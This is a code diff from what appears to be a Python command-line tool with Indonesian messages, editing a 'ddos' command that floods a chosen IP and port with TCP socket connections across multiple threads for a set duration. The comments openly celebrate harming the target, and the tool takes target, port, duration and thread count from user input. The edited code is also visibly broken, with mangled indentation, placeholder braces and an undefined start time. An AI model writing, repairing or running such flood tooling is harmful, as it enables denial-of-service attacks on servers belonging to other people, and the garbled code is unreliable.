@@ -95,18 +95,13 @@ def ai_response(prompt):
 
 def ddos(target, port, duration, threads):
     global stop_ddos
-    import socket
-import threading
-import time
-
-# ⚠️ FILL THIS SHIT OUT ⚠️
+    # ⚠️ FILL THIS SHIT OUT ⚠️
 TARGET_IP = (target)  # 🎯 Target's IP (make 'em weep)
 TARGET_PORT = {port}  # 🔥 Common ports: 80 (HTTP), 443 (HTTPS)
 THREAD_COUNT = {threads}  # 👹 More threads = more pain
 ATTACK_DURATION = {time}  # ⏳ Seconds to fuck their shit up
 
-def flood():
-    while time.time() < start_time + ATTACK_DURATION:
+while time.time() < start_time + ATTACK_DURATION:
         try:
             # 🧨 Create socket go brrrrr
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -215,11 +210,11 @@ if __name__ == "__main__":
                     duration = int(parts[3])
                     stop_ddos = False  # Reset flag stop
                     # Jalankan DDoS dalam thread terpisah
-                    threading.Thread(target=ddos, args=(target, port, duration)).start()
+                    threading.Thread(target=ddos, args=(target, port, duration, threads)).start()
                 except ValueError:
                     print(Fore.RED + "Durasi harus berupa angka.")
             else:
-                print(Fore.RED + "Ex: ddos <ip/web> <port> <durasi>")
+                print(Fore.RED + "Ex: ddos <ip/web> <port> <durasi> <threads>")
         
         elif command.startswith("kalkulator"):
             parts = command.split()
